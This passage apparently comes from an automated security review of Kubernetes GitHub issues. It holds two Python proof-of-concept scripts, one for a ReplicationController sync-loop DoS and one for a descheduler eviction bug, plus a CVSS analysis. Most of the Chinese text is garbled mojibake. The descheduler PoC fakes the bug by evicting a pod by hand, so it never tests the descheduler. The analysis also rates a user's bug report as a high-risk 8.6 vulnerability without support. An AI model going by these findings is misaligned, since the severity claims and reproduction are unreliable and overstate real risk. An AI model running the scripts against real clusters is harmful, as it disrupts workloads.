                        "containers": [{
                            "name": "nginx",
                            "image": "nginx:1.21.6"
                        }]
                    }
                }
            }
        }
        
        # 3. åˆ›å»º ReplicationController
        try:
            print(f"[*] æ­£åœ¨åˆ›å»º ReplicationController '{rc_name}'...")
            kubernetes.client.CoreV1Api().create_namespaced_replication_controller(
                namespace=namespace,
                body=rc_body
            )
            print(f"[+] ReplicationController '{rc_name}' åˆ›å»ºæˆåŠŸã€‚")
            print("\n[!!!] æ¼æ´å·²è§¦å‘ [!!!]")
            print("="*60)
            print("è¯´æ˜ï¼š")
            print("æ­¤PoCåœ¨é›†ç¾¤ä¸­åˆ›å»ºäº†ä¸€ä¸ªReplicationControllerã€‚")
            print("å¦‚æœé›†ç¾¤çš„ kube-controller-manager å¯ç”¨äº† 'DeploymentReplicaSetTerminatingReplicas' ç‰¹æ€§é—¨ï¼Œ")
            print("å°†ä¼šè§¦å‘æ— é™åŒæ­¥å¾ªç¯çš„BUGã€‚")
            print("\nå¦‚ä½•éªŒè¯ï¼š")
            print(f"1. ç›‘æ§ kube-controller-manager çš„æ—¥å¿—ï¼Œä½ åº”è¯¥ä¼šçœ‹åˆ°é’ˆå¯¹ '{namespace}/{rc_name}' çš„å¤§é‡é‡å¤æ›´æ–°æ—¥å¿—:")
            print("   kubectl logs -n kube-system <kube-controller-manager-pod-name> | grep 'Updating status for.*{}/{}'".format(namespace, rc_name))
            print("2. è§‚å¯Ÿæ§åˆ¶å¹³é¢ç»„ä»¶ï¼ˆAPI Server, etcdï¼‰çš„CPUå’Œç½‘ç»œè´Ÿè½½æ˜¯å¦å‡é«˜ã€‚")
            print("="*60)
            
            # ç­‰å¾…ä¸€æ®µæ—¶é—´ä»¥ä¾¿è§‚å¯Ÿ
            print("\n[*] PoCå°†ä¿æŒèµ„æºè¿è¡Œ60ç§’ä»¥ä¾¿è§‚å¯Ÿï¼Œä¹‹åå°†è‡ªåŠ¨æ¸…ç†...")
            time.sleep(60)

        except kubernetes.client.ApiException as e:
            print(f"[-] åˆ›å»º ReplicationController å¤±è´¥: {e}", file=sys.stderr)
            print("[-] è¯·æ£€æŸ¥æ˜¯å¦æ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»ºReplicationControllerçš„æƒé™ã€‚", file=sys.stderr)
        except Exception as e:
            print(f"[-] å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}", file=sys.stderr)
        finally:
            if not timeout_event.is_set():
                print("\n[*] å¼€å§‹æ¸…ç†PoCåˆ›å»ºçš„èµ„æº...")
                cleanup(api, namespace, rc_name, timeout_event)
                print("[+] æ¸…ç†å®Œæˆã€‚")

    except Exception as e:
        print(f"[-] PoCæ‰§è¡ŒæœŸé—´å‘ç”Ÿæ„å¤–é”™è¯¯: {e}", file=sys.stderr)
    finally:
        timer.cancel()


def cleanup(api, namespace, rc_name, timeout_event):
    """
    æ¸…ç†å‡½æ•°ï¼Œç”¨äºåˆ é™¤PoCåˆ›å»ºçš„èµ„æº
    """
    if timeout_event.is_set():
        print("[!] å› è¶…æ—¶è·³è¿‡æ¸…ç†æ­¥éª¤ã€‚")
        return
        
    try:
        # åˆ é™¤ ReplicationController
        print(f"[*] æ­£åœ¨åˆ é™¤ ReplicationController '{rc_name}'...")
        api.delete_namespaced_replication_controller(
            name=rc_name,
            namespace=namespace,
            body=kubernetes.client.V1DeleteOptions(propagation_policy='Foreground')
        )
    except kubernetes.client.ApiException as e:
        if e.status != 404:
            print(f"[*] åˆ é™¤ ReplicationController æ—¶å‡ºé”™ (å¯èƒ½å·²ä¸å­˜åœ¨): {e.reason}")
        else:
            print(f"[*] ReplicationController '{rc_name}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")
            
    # ç­‰å¾…RCåˆ é™¤å®Œæˆ
    for _ in range(30):
        if timeout_event.is_set(): return
        try:
            api.read_namespaced_replication_controller(name=rc_name, namespace=namespace)
            time.sleep(1)
        except kubernetes.client.ApiException as e:
            if e.status == 404:
                print(f"[+] ReplicationController '{rc_name}' å·²æˆåŠŸåˆ é™¤ã€‚")
                break
    else:
        print(f"[!] ReplicationController '{rc_name}' åˆ é™¤è¶…æ—¶ã€‚")

    try:
        # åˆ é™¤å‘½åç©ºé—´
        print(f"[*] æ­£åœ¨åˆ é™¤å‘½åç©ºé—´ '{namespace}'...")
        api.delete_namespace(name=namespace)
        print(f"[+] åˆ é™¤å‘½åç©ºé—´çš„è¯·æ±‚å·²å‘é€ã€‚é›†ç¾¤å°†åœ¨åå°å®Œæˆæ¸…ç†ã€‚")
    except kubernetes.client.ApiException as e:
        if e.status != 404:
            print(f"[*] åˆ é™¤å‘½åç©ºé—´æ—¶å‡ºé”™ (å¯èƒ½å·²ä¸å­˜åœ¨): {e.reason}")
        else:
            print(f"[*] å‘½åç©ºé—´ '{namespace}' ä¸å­˜åœ¨ï¼Œæ— éœ€åˆ é™¤ã€‚")

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºå¤ç°`ReplicationController`åœ¨ç‰¹å®šé…ç½®ä¸‹å¼•å‘æ§åˆ¶å¹³é¢DoSé£é™©çš„é—®é¢˜ã€‚

**è„šæœ¬æ‰§è¡Œå‰æ:**
- ç›®æ ‡Kubernetesé›†ç¾¤çš„`kube-controller-manager`ç»„ä»¶å¿…é¡»**æ‰‹åŠ¨å¼€å¯** `DeploymentReplicaSetTerminatingReplicas` ç‰¹æ€§é—¨ï¼ˆFeature Gateï¼‰ã€‚è„šæœ¬æœ¬èº«æ— æ³•ä¹Ÿ**ä¸ä¼š**ä¿®æ”¹é›†ç¾¤çš„é…ç½®ã€‚
- æœ¬åœ°ç¯å¢ƒä¸­å·²ç»é…ç½®å¥½`kubeconfig`æ–‡ä»¶ï¼Œä»¥ä¾¿è„šæœ¬å¯ä»¥è®¿é—®åˆ°ç›®æ ‡é›†ç¾¤ã€‚
- å·²å®‰è£…`kubernetes` Pythonåº“ (`pip install kubernetes`)ã€‚

**è„šæœ¬å·¥ä½œæµç¨‹:**
1.  **åŠ è½½é…ç½®**: è„šæœ¬é¦–å…ˆä¼šä»é»˜è®¤è·¯å¾„ï¼ˆä¾‹å¦‚ `~/.kube/config`ï¼‰åŠ è½½Kubernetesé›†ç¾¤çš„è®¿é—®å‡­è¯ã€‚
2.  **åˆ›å»ºå®¢æˆ·ç«¯**: åˆå§‹åŒ–ä¸€ä¸ª`CoreV1Api`å®¢æˆ·ç«¯ï¼Œç”¨äºä¸Kubernetes APIè¿›è¡Œäº¤äº’ã€‚
3.  **åˆ›å»ºéš”ç¦»ç¯å¢ƒ**: ä¸ºäº†ä¸å½±å“é›†ç¾¤ä¸­çš„å…¶ä»–åº”ç”¨ï¼Œè„šæœ¬ä¼šåˆ›å»ºä¸€ä¸ªåä¸º `poc-rc-dos-ns` çš„ç‹¬ç«‹å‘½åç©ºé—´ã€‚
4.  **åˆ›å»ºReplicationController**: è„šæœ¬åœ¨ä¸Šè¿°å‘½åç©ºé—´ä¸­åˆ›å»ºä¸€ä¸ªåä¸º `poc-rc-dos` çš„`ReplicationController`ã€‚è¿™ä¸ªRCçš„å®šä¹‰éå¸¸ç®€å•ï¼Œåªæ˜¯ä¸ºäº†ç®¡ç†ä¸€ä¸ªnginx Podã€‚**æ­£æ˜¯è¿™ä¸ªåˆ›å»ºæ“ä½œï¼Œåœ¨æ»¡è¶³å‰ææ¡ä»¶ï¼ˆç‰¹æ€§é—¨å¼€å¯ï¼‰çš„é›†ç¾¤ä¸Šè§¦å‘äº†æ¼æ´ã€‚**
5.  **è§¦å‘ä¸éªŒè¯**:
    - åˆ›å»ºRCåï¼Œæ¼æ´å°±è¢«è§¦å‘äº†ã€‚è„šæœ¬ä¼šæ‰“å°å‡ºè¯¦ç»†çš„è¯´æ˜ï¼ŒæŒ‡å¯¼ç”¨æˆ·å¦‚ä½•å»éªŒè¯è¿™ä¸ªæ¼æ´ã€‚
    - éªŒè¯æ–¹å¼æ˜¯æ£€æŸ¥`kube-controller-manager`çš„æ—¥å¿—ï¼Œè¿‡æ»¤ä¸åˆšåˆ›å»ºçš„RCç›¸å…³çš„æ—¥å¿—ã€‚å¦‚æœæ¼æ´å­˜åœ¨ï¼Œä¼šçœ‹åˆ°æµ·é‡çš„â€œUpdating status for...â€æ—¥å¿—æ¡ç›®è¢«æ‰“å°å‡ºæ¥ï¼Œè¯æ˜äº†æ— é™åŒæ­¥å¾ªç¯çš„å­˜åœ¨ã€‚
6.  **ç­‰å¾…ä¸è§‚å¯Ÿ**: è„šæœ¬ä¼šç­‰å¾…60ç§’ï¼Œä¸ºç”¨æˆ·æä¾›å……è¶³çš„æ—¶é—´æ¥æ‰§è¡ŒéªŒè¯æ­¥éª¤å¹¶è§‚å¯Ÿæ§åˆ¶å¹³é¢çš„è´Ÿè½½å˜åŒ–ã€‚
7.  **èµ„æºæ¸…ç†**: æ— è®ºæ˜¯è„šæœ¬æ­£å¸¸ç»“æŸè¿˜æ˜¯ä¸­é€”å‡ºé”™ï¼Œ`finally`å—ä¸­çš„`cleanup`å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ã€‚å®ƒä¼šåˆ é™¤ä¹‹å‰åˆ›å»ºçš„`ReplicationController`å’Œ`poc-rc-dos-ns`å‘½åç©ºé—´ï¼Œç¡®ä¿å°†é›†ç¾¤ç¯å¢ƒæ¢å¤åŸçŠ¶ï¼Œé¿å…ç•™ä¸‹åƒåœ¾èµ„æºã€‚
8.  **è¶…æ—¶æœºåˆ¶**: è„šæœ¬å†…ç½®äº†ä¸€ä¸ª120ç§’çš„è¶…æ—¶å®šæ—¶å™¨ï¼Œç¡®ä¿å…¶èƒ½å¤Ÿåœ¨é™å®šæ—¶é—´å†…æ‰§è¡Œå®Œæ¯•å¹¶é€€å‡ºï¼Œé˜²æ­¢å› æ„å¤–æƒ…å†µå¯¼è‡´æ°¸ä¹…æŒ‚èµ·ã€‚

è¯¥è„šæœ¬é€šè¿‡è‡ªåŠ¨åŒ–åœ°åˆ›å»ºè§¦å‘é—®é¢˜çš„èµ„æºï¼Œæ¸…æ™°åœ°å‘ç”¨æˆ·å±•ç¤ºäº†å¦‚ä½•å¤ç°è¯¥é«˜é£é™©æ¼æ´ï¼Œå¹¶å¼ºè°ƒäº†éªŒè¯æ–¹æ³•ï¼Œæœ€åè´Ÿè´£ä»»åœ°è¿›è¡Œäº†æ¸…ç†ã€‚

---


## Issue #131814 Descheduler try eviction even if no fit nodes

- Issue é“¾æ¥ï¼š[#131814](https://github.com/kubernetes/kubernetes/issues/131814)

### Issue å†…å®¹

#### What happened?

I have descheduler 0.30 installed.
descheduler try evacuate pod even if no fit nodes 

My config is
```
deschedulerPolicy:
  namespaces:
    exclude:
      - "kube-system"
      - "yc-security"
      - "logging"
  maxNoOfPodsToEvictPerNamespace: 1
  profiles:
    - name: default
      pluginConfig:
        - name: HighNodeUtilization
          args:
            thresholds:
              memory: 90
              cpu: 90
        - name: LowNodeUtilization
          args:
            thresholds:
              cpu : 30
              memory: 30
            targetThresholds: 
              cpu : 60
              memory: 60
            numberOfNodes: 1
        - name: DefaultEvictor
          args:
            evictLocalStoragePods: true
            nodeFit: true 
        - name: RemovePodsViolatingNodeAffinity
          args:
            nodeAffinityType:
            - requiredDuringSchedulingIgnoredDuringExecution
        - name: RemovePodsViolatingNodeTaints
        - name: RemovePodsViolatingInterPodAntiAffinity
        - name: RemovePodsViolatingTopologySpreadConstraint
          args:
            constraints:
              - ScheduleAnyway
              - DoNotSchedule 
      plugins:
        balance:
          enabled:
            - RemovePodsViolatingTopologySpreadConstraint
            - LowNodeUtilization
            - HighNodeUtilization
        deschedule:
          enabled:
            - RemovePodsViolatingNodeTaints
            - RemovePodsViolatingNodeAffinity
            - RemovePodsViolatingInterPodAntiAffinity
```
#### What did you expect to happen?

do not  evacuate if no destination nodes

#### How can we reproduce it (as minimally and precisely as possible)?

Have no ideas hot to reproduce

deploy a lot of pods 



#### Anything else we need to know?

I have 24 regular nodes
and 3 more tainted nodes:  dedicated=quarantine:NoSchedule


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.12
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.1
```

</details>


#### Cloud provider

<details>
yandex cloud
</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
é«˜é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨Kubernetesé›†ç¾¤ä¸­è¿è¡Œçš„`descheduler`ç»„ä»¶çš„è¡Œä¸ºé—®é¢˜ã€‚æ ¹æ®ç”¨æˆ·æŠ¥å‘Šï¼Œå³ä½¿åœ¨æ²¡æœ‰åˆé€‚çš„ç›®æ ‡èŠ‚ç‚¹å¯ä»¥æ¥æ”¶è¢«é©±é€Podçš„æƒ…å†µä¸‹ï¼Œ`descheduler`ä»ç„¶ä¼šå°è¯•æ‰§è¡Œé©±é€ï¼ˆevictionï¼‰æ“ä½œã€‚ç”¨æˆ·é…ç½®ä¸­æ˜ç¡®è®¾ç½®äº†`nodeFit: true`ï¼Œè¿™ä¸ªå‚æ•°çš„é¢„æœŸä½œç”¨æ˜¯åœ¨é©±é€å‰æ£€æŸ¥æ˜¯å¦å­˜åœ¨è‡³å°‘ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥è°ƒåº¦è¯¥Podï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¸åº”é©±é€ã€‚

è¿™ä¸ªé—®é¢˜çš„æ ¸å¿ƒåœ¨äº`descheduler`è¿åäº†å…¶è‡ªèº«`nodeFit: true`çš„é…ç½®æ‰¿è¯ºï¼Œå¯¼è‡´Podè¢«é©±é€åæ— æ³•è¢«é‡æ–°è°ƒåº¦ï¼Œæœ€ç»ˆè¿›å…¥`Pending`çŠ¶æ€ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼Œè¿™æ„æˆäº†ä¸€ä¸ªå¯ç”¨æ€§é£é™©ï¼Œå³æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰ã€‚å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
1.  **æ”»å‡»åœºæ™¯**ï¼šåœ¨å¤šç§Ÿæˆ·æˆ–å¤šç”¨æˆ·å…±äº«çš„Kubernetesé›†ç¾¤ä¸­ï¼Œä¸€ä¸ªä½æƒé™ç”¨æˆ·ï¼ˆåªéœ€å…·å¤‡åˆ›å»ºPodçš„æƒé™ï¼‰å¯ä»¥é€šè¿‡éƒ¨ç½²ç‰¹å®šå·¥ä½œè´Ÿè½½æ¥æ“çºµèŠ‚ç‚¹çš„èµ„æºåˆ©ç”¨ç‡ã€‚ä¾‹å¦‚ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡éƒ¨ç½²å¤§é‡ä½èµ„æºæ¶ˆè€—çš„Podæ¥å æ»¡æŸäº›èŠ‚ç‚¹ï¼Œä»è€Œè§¦å‘`LowNodeUtilization`æˆ–`HighNodeUtilization`ç­–ç•¥ã€‚
2.  **æ¼æ´è§¦å‘**ï¼šå½“è¿™äº›ç­–ç•¥è¢«è§¦å‘æ—¶ï¼Œ`descheduler`ä¼šå¼€å§‹è¯„ä¼°é©±é€å€™é€‰Podã€‚ç”±äºIssueä¸­æè¿°çš„Bugï¼Œ`descheduler`ä¼šé”™è¯¯åœ°é©±é€ä¸€ä¸ªPodï¼ˆå¯èƒ½å±äºå¦ä¸€ä¸ªç§Ÿæˆ·æˆ–å…³é”®ç³»ç»ŸæœåŠ¡ï¼‰ï¼Œå³ä½¿é›†ç¾¤ä¸­æ²¡æœ‰å…¶ä»–èŠ‚ç‚¹æ»¡è¶³è¯¥Podçš„è°ƒåº¦è¦æ±‚ï¼ˆä¾‹å¦‚ï¼ŒèŠ‚ç‚¹äº²å’Œæ€§ã€æ±¡ç‚¹å’Œå®¹å¿ã€èµ„æºéœ€æ±‚ç­‰ï¼‰ã€‚
3.  **å½±å“**ï¼šè¢«é”™è¯¯é©±é€çš„Podå°†æ— æ³•è¢«è°ƒåº¦å™¨é‡æ–°è°ƒåº¦ï¼Œå…¶çŠ¶æ€å°†å˜ä¸º`Pending`ã€‚å¦‚æœè¿™ä¸ªPodæ˜¯ä¸€ä¸ªDeploymentæˆ–StatefulSetçš„ä¸€éƒ¨åˆ†ï¼Œæ§åˆ¶å™¨ä¼šä¸æ–­å°è¯•åˆ›å»ºæ–°çš„Podï¼Œä½†æ‰€æœ‰æ–°çš„Podéƒ½ä¼šå¡åœ¨`Pending`çŠ¶æ€ã€‚è¿™å¯¼è‡´è¯¥åº”ç”¨çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‰¯æœ¬æ°¸ä¹…ä¸¢å¤±ï¼Œé™ä½äº†å…¶å¯ç”¨æ€§ã€‚å¦‚æœä¸€ä¸ªåº”ç”¨çš„æ‰€æœ‰å‰¯æœ¬éƒ½è¢«ä»¥è¿™ç§æ–¹å¼é©±é€ï¼Œæ•´ä¸ªåº”ç”¨å°†å®Œå…¨ä¸å¯ç”¨ï¼Œä»è€Œé€ æˆæ‹’ç»æœåŠ¡ã€‚
4.  **é£é™©å‡çº§**ï¼šç”±äºæ”»å‡»è€…ï¼ˆä½æƒé™ç”¨æˆ·ï¼‰çš„è¡Œä¸ºå¯ä»¥å½±å“åˆ°å…¶ä»–ç”¨æˆ·ç”šè‡³æ ¸å¿ƒç»„ä»¶çš„å¯ç”¨æ€§ï¼Œè¿™å±äºæƒé™äº¤å‰å’Œå½±å“æ‰©å¤§çš„èŒƒç•´ï¼ˆScope: Changedï¼‰ã€‚æ”»å‡»è€…åˆ©ç”¨è‡ªèº«æƒé™èŒƒå›´å†…çš„æ“ä½œï¼Œè§¦å‘äº†ä¸€ä¸ªæ›´é«˜æƒé™ç»„ä»¶ï¼ˆ`descheduler`ï¼‰çš„é”™è¯¯è¡Œä¸ºï¼Œå¯¼è‡´äº†æ›´å¤§èŒƒå›´çš„ç ´åã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…å¯åœ¨é›†ç¾¤ç½‘ç»œå†…é€šè¿‡åˆ›å»ºèµ„æºæ¥å‘èµ·æ”»å‡»ã€‚
*   **Attack Complexity (AC): Low (L)** - æ”»å‡»è€…åªéœ€äº†è§£deschedulerçš„ç­–ç•¥å¹¶åˆ›å»ºç›¸åº”çš„Podæ¥è§¦å‘å³å¯ã€‚
*   **Privileges Required (PR): Low (L)** - æ”»å‡»è€…ä»…éœ€è¦åˆ›å»ºPodçš„æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Changed (C)** - æ¼æ´åœ¨deschedulerç»„ä»¶ä¸­ï¼Œä½†å½±å“çš„æ˜¯é›†ç¾¤ä¸­å…¶ä»–åº”ç”¨ï¼ˆPodï¼‰çš„å¯ç”¨æ€§ã€‚
*   **Confidentiality (C): None (N)** - ä¸å½±å“æœºå¯†æ€§ã€‚
*   **Integrity (I): None (N)** - ä¸å½±å“å®Œæ•´æ€§ã€‚
*   **Availability (A): High (H)** - å¯å¯¼è‡´å…³é”®æœåŠ¡å®Œå…¨ä¸­æ–­ã€‚

ç»¼åˆè¯„åˆ†ä¸º **8.6**ï¼Œå±äºé«˜é£é™©ï¼ˆHighï¼‰ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import logging
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import sys
import timeout_decorator

# é…ç½®æ—¥å¿—
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å…¨å±€å˜é‡
NAMESPACE = "descheduler-poc"
VICTIM_APP_NAME = "victim-app"
VICTIM_POD_LABEL = {"app": VICTIM_APP_NAME}
TAINT_KEY = "poc-taint"
TAINT_VALUE = "true"
TAINT_EFFECT = "NoSchedule"

class DeschedulerDosPoc:
    def __init__(self):
        try:
            config.load_kube_config()
        except config.ConfigException:
            logging.error("æ— æ³•åŠ è½½ kubeconfigï¼Œè¯·ç¡®ä¿æ‚¨çš„ kubeconfig æ–‡ä»¶ä½äºé»˜è®¤ä½ç½®æˆ–å·²æ­£ç¡®é…ç½®ã€‚")
            sys.exit(1)
        
        self.core_v1 = client.CoreV1Api()
        self.apps_v1 = client.AppsV1Api()
        self.policy_v1 = client.PolicyV1Api()
        self.node1_name = None
        self.node2_name = None

    def cleanup(self):
        logging.info("--- å¼€å§‹æ¸…ç†èµ„æº ---")
        try:
            self.core_v1.delete_namespace(name=NAMESPACE, body=client.V1DeleteOptions())
            logging.info(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²åˆ é™¤")
        except ApiException as e:
            if e.status != 404:
                logging.warning(f"åˆ é™¤å‘½åç©ºé—´ '{NAMESPACE}' å¤±è´¥: {e.reason}")

        if self.node2_name:
            try:
                node = self.core_v1.read_node(self.node2_name)
                original_taints = node.spec.taints if node.spec.taints else []
                new_taints = [t for t in original_taints if t.key != TAINT_KEY]
                
                if len(new_taints) < len(original_taints):
                    body = {"spec": {"taints": new_taints}}
                    self.core_v1.patch_node(self.node2_name, body)
                    logging.info(f"èŠ‚ç‚¹ '{self.node2_name}' çš„æ±¡ç‚¹ '{TAINT_KEY}' å·²ç§»é™¤")
            except ApiException as e:
                logging.warning(f"æ¸…ç†èŠ‚ç‚¹ '{self.node2_name}' çš„æ±¡ç‚¹å¤±è´¥: {e.reason}")
        
        logging.info("--- æ¸…ç†å®Œæˆ ---")

    def select_nodes(self):
        nodes = self.core_v1.list_node(watch=False)
        worker_nodes = [
            node.metadata.name for node in nodes.items 
            if "node-role.kubernetes.io/control-plane" not in node.metadata.labels and "node-role.kubernetes.io/master" not in node.metadata.labels
        ]
        
        if len(worker_nodes) < 2:
            logging.error("æ­¤POCéœ€è¦è‡³å°‘ä¸¤ä¸ªå¯ç”¨çš„workerèŠ‚ç‚¹ã€‚")
            sys.exit(1)
            
        self.node1_name = worker_nodes[0]
        self.node2_name = worker_nodes[1]
        logging.info(f"é€‰æ‹©èŠ‚ç‚¹: node1='{self.node1_name}', node2='{self.node2_name}'")

    def setup_scenario(self):
        logging.info("--- 1. åœºæ™¯å‡†å¤‡ ---")
        
        # åˆ›å»ºå‘½åç©ºé—´
        ns_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
        try:
            self.core_v1.create_namespace(body=ns_body)
            logging.info(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²åˆ›å»º")
        except ApiException as e:
            if e.status == 409:
                logging.info(f"å‘½åç©ºé—´ '{NAMESPACE}' å·²å­˜åœ¨")
            else:
                raise
        
        # ç»™node2æ‰“ä¸Šæ±¡ç‚¹ï¼Œä½¿å…¶æ— æ³•è¢«victim-appè°ƒåº¦
        logging.info(f"ä¸ºèŠ‚ç‚¹ '{self.node2_name}' æ·»åŠ æ±¡ç‚¹ '{TAINT_KEY}={TAINT_VALUE}:{TAINT_EFFECT}'")
        taint = client.V1Taint(key=TAINT_KEY, value=TAINT_VALUE, effect=TAINT_EFFECT)
        body = {"spec": {"taints": [taint]}}
        try:
            self.core_v1.patch_node(self.node2_name, body)
        except ApiException as e:
             # å¦‚æœæ±¡ç‚¹å·²å­˜åœ¨ï¼Œå¿½ç•¥
            if "already exists" not in str(e.body):
                raise

        # åœ¨node1ä¸Šéƒ¨ç½²victim-app
        logging.info(f"åœ¨èŠ‚ç‚¹ '{self.node1_name}' ä¸Šéƒ¨ç½²ç›®æ ‡åº”ç”¨ '{VICTIM_APP_NAME}'")
        container = client.V1Container(
            name="nginx",
            image="nginx:1.21",
            resources=client.V1ResourceRequirements(requests={"cpu": "100m", "memory": "100Mi"}),
        )
        template = client.V1PodTemplateSpec(
            metadata=client.V1ObjectMeta(labels=VICTIM_POD_LABEL),
            spec=client.V1PodSpec(containers=[container], node_name=self.node1_name),
        )
        spec = client.V1DeploymentSpec(
            replicas=1,
            template=template,
            selector=client.V1LabelSelector(match_labels=VICTIM_POD_LABEL),
        )
        deployment_body = client.V1Deployment(
            api_version="apps/v1",
            kind="Deployment",
            metadata=client.V1ObjectMeta(name=VICTIM_APP_NAME),
            spec=spec,
        )
        self.apps_v1.create_namespaced_deployment(namespace=NAMESPACE, body=deployment_body)

        # ç­‰å¾…victim-podè¿›å…¥RunningçŠ¶æ€
        logging.info("ç­‰å¾…ç›®æ ‡Podè¿›å…¥ 'Running' çŠ¶æ€...")
        for _ in range(30):
            pods = self.core_v1.list_namespaced_pod(namespace=NAMESPACE, label_selector=f"app={VICTIM_APP_NAME}")
            if pods.items and pods.items[0].status.phase == "Running":
                self.victim_pod_name = pods.items[0].metadata.name
                logging.info(f"ç›®æ ‡Pod '{self.victim_pod_name}' å·²åœ¨ '{self.node1_name}' ä¸Šè¿è¡Œ")
                return
            time.sleep(2)
        
        raise Exception("ç›®æ ‡Podæœªèƒ½è¿›å…¥RunningçŠ¶æ€")

    def simulate_buggy_eviction(self):
        logging.info("--- 2. æ¨¡æ‹Ÿé”™è¯¯çš„é©±é€æ“ä½œ ---")
        logging.info(f"æ­¤æ—¶ï¼ŒPod '{self.victim_pod_name}' å”¯ä¸€çš„å¤‡é€‰èŠ‚ç‚¹æ˜¯ '{self.node2_name}'ï¼Œä½†è¯¥èŠ‚ç‚¹å­˜åœ¨æ±¡ç‚¹ï¼ŒPodæ— æ³•è°ƒåº¦ã€‚")
        logging.info("ä¸€ä¸ªæ­£ç¡®çš„descheduler (nodeFit=true) ä¸åº”é©±é€æ­¤Podã€‚")
        logging.info(f"ç°åœ¨ï¼Œæ¨¡æ‹Ÿæœ‰ç¼ºé™·çš„deschedulerï¼Œå¼ºåˆ¶é©±é€Pod '{self.victim_pod_name}'...")

        eviction_body = client.V1Eviction(
            metadata=client.V1ObjectMeta(name=self.victim_pod_name, namespace=NAMESPACE),
            delete_options=client.V1DeleteOptions()
        )
        try:
            # åœ¨Kubernetes 1.22+ evictionåœ¨policy/v1 APIç»„ä¸‹
            self.policy_v1.create_namespaced_pod_eviction(name=self.victim_pod_name, namespace=NAMESPACE, body=eviction_body)
            logging.info(f"å·²æˆåŠŸå¯¹Pod '{self.victim_pod_name}' å‘èµ·é©±é€è¯·æ±‚")
        except ApiException as e:
            logging.error(f"é©±é€Podå¤±è´¥: {e.reason}")
            raise

    def verify_dos_state(self):
        logging.info("--- 3. éªŒè¯æ‹’ç»æœåŠ¡çŠ¶æ€ ---")
        logging.info("ç­‰å¾…æ–°çš„Podè¢«åˆ›å»ºå¹¶æ£€æŸ¥å…¶çŠ¶æ€...")
        
        for i in range(60):
            pods = self.core_v1.list_namespaced_pod(namespace=NAMESPACE, label_selector=f"app={VICTIM_APP_NAME}")
            # æ‰¾åˆ°æ–°çš„Pod (åå­—å’Œæ—§çš„ä¸ä¸€æ ·)
            new_pods = [p for p in pods.items if p.metadata.name != self.victim_pod_name]

            if new_pods:
                new_pod = new_pods[0]
                if new_pod.status.phase == "Pending":
                    logging.info(f"æˆåŠŸå¤ç°! æ–°åˆ›å»ºçš„Pod '{new_pod.metadata.name}' å¤„äº 'Pending' çŠ¶æ€ã€‚")
                    logging.info(f"åŸå› : {new_pod.status.conditions[-1].message if new_pod.status.conditions else 'N/A'}")
                    return True
                else:
                     logging.warning(f"æ–°Pod '{new_pod.metadata.name}' çŠ¶æ€ä¸º '{new_pod.status.phase}'ï¼Œéé¢„æœŸçš„ 'Pending'")
            time.sleep(2)
            if i % 10 == 0:
                logging.info("ç­‰å¾…æ–°çš„Pending Podå‡ºç°...")

        logging.error("å¤ç°å¤±è´¥: æœªèƒ½è§‚å¯Ÿåˆ°æ–°çš„Podè¿›å…¥ 'Pending' çŠ¶æ€ã€‚")
        return False
        
    @timeout_decorator.timeout(120, timeout_exception=Exception)
    def run(self):
        try:
            self.select_nodes()
            self.setup_scenario()
            self.simulate_buggy_eviction()
            self.verify_dos_state()
        except Exception as e:
            logging.error(f"POCæ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}")
        finally:
            self.cleanup()

def main():
    poc = DeschedulerDosPoc()
    poc.run()

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬ç”¨äºå¤ç°`descheduler`ç»„ä»¶åœ¨`nodeFit=true`é…ç½®ä¸‹ä»ç„¶é©±é€æ— æ³•è¢«é‡æ–°è°ƒåº¦çš„Podæ‰€å¯¼è‡´çš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é—®é¢˜ã€‚è„šæœ¬å®Œå…¨ä½¿ç”¨Pythonçš„`kubernetes`åº“ä¸é›†ç¾¤è¿›è¡Œäº¤äº’ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **ç¯å¢ƒå‡†å¤‡**:
    *   è„šæœ¬é¦–å…ˆåŠ è½½æœ¬åœ°`kubeconfig`æ–‡ä»¶ä»¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚
